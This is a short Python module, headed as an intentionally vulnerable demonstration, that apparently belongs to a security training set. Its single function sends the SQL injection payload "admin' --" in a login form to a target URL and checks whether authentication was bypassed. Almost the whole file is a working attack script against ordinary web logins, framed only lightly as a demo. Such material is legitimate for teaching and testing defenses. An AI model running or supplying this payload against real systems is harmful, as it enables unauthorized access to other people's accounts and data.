"""
⚠️ INTENTIONALLY VULNERABLE MODULE ⚠️
Module: SQL Injection - Auth Bypass
Description: Demonstrates bypassing login using SQL injection.
"""

import requests

def exploit_auth_bypass(url, username="admin' --"):
    """
    Attempts to bypass authentication using a simple SQL injection payload.
    """
    payload = {
        'username': username,
        'password': 'any_password'
    }
    
    print(f"[*] Attempting auth bypass on {url} with payload: {username}")
    response = requests.post(f"{url}/login", data=payload)
    
    if "Logged in successfully" in response.text or response.status_code == 302:
        print("[+] Success! Authentication bypassed.")
        return True
    else:
        print("[-] Failed to bypass authentication.")
        return False
